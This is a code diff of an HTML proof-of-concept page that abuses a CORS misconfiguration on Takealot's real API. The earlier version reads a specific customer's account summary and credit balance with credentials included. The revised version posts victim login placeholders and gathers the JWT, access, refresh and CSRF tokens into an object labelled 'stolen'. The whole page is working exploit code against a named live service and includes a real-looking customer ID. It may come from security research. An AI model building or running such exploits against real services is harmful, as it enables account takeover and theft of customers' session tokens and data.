@@ -1,39 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS PoC</title>
+  <title>Takealot CORS PoC</title>
 </head>
 <body>
-<h1>CORS PoC - Takealot</h1>
-<p>Fetching account data cross-origin...</p>
+<h1>Takealot CORS PoC - JWT Theft via Login</h1>
+<p>Simulating cross-origin login credential theft...</p>
 <pre id="output">Loading...</pre>
-<pre id="cookies">Waiting...</pre>
 <script>
-  // Attempt 1: Fetch account summary cross-origin with credentials
-  fetch("https://api.takealot.com/rest/v-1-16-0/customers/2678447/summary", {
-    credentials: "include"
-  })
-  .then(r => {
-    document.getElementById("output").innerText = "Status: " + r.status + "\n"
-    return r.json()
-  })
-  .then(data => {
-    document.getElementById("output").innerText += JSON.stringify(data, null, 2)
-  })
-  .catch(err => {
-    document.getElementById("output").innerText = "Error: " + err
-  })
-
-  // Attempt 2: Fetch credits balance
-  fetch("https://api.takealot.com/rest/v-1-16-0/customers/2678447/credits/balance", {
-    credentials: "include"
+  fetch("https://api.takealot.com/rest/v-1-16-0/customers/login?section_id=customer_login", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json",
+      "X-Csrf-Token": "d41d8cd9"
+    },
+    body: JSON.stringify({
+      email: "VICTIM_EMAIL",
+      password: "VICTIM_PASSWORD"
+    })
   })
   .then(r => r.json())
   .then(data => {
-    document.getElementById("cookies").innerText = "Credits: " + JSON.stringify(data, null, 2)
+    const stolen = {
+      jwt: data.auth_info?.jwt,
+      access_token: data.auth_info?.access_token,
+      refresh_token: data.auth_info?.refresh_token,
+      csrf_token: data.auth_info?.csrf_token,
+      customer_id: data.auth_info?.customer_id,
+      email: data.auth_info?.email
+    }
+    document.getElementById("output").innerText = JSON.stringify(stolen, null, 2)
   })
   .catch(err => {
-    document.getElementById("cookies").innerText = "Credits error: " + err
+    document.getElementById("output").innerText = "Error: " + err
   })
 </script>
 </body>
